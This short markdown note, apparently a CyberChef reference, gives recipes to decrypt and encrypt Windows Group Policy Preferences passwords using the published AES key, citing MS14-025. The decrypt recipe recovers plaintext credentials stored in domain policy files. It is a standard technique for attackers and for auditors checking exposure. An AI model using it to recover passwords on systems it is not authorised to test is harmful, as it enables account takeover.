# Encrypted credentials in Group Policy Preferences (GPP)

Related Microsoft security bulletin: [MS14-025](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025)

AES Key: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be

## Decrypt recipe
```
From_Base64('A-Za-z0-9+/=',true,false)
AES_Decrypt({'option':'Hex','string':'4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8 f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b'},{'option':'Hex','string':'0000000000000000000000000000000'},'CBC','Raw','Raw',{'option':'Hex','string':''},{'option':'Hex','string':''})
Decode_text('UTF-16LE (1200)')
```

## Encrypt recipe
```
Encode_text('UTF-16LE (1200)')
AES_Encrypt({'option':'Hex','string':'4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8 f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b'},{'option':'Hex','string':'0000000000000000000000000000000'},'CBC','Raw','Raw',{'option':'Hex','string':''})
To_Base64('A-Za-z0-9+/=')
Find_/_Replace({'option':'Regex','string':'={1,2}$'},'',false,false,false,false)
```
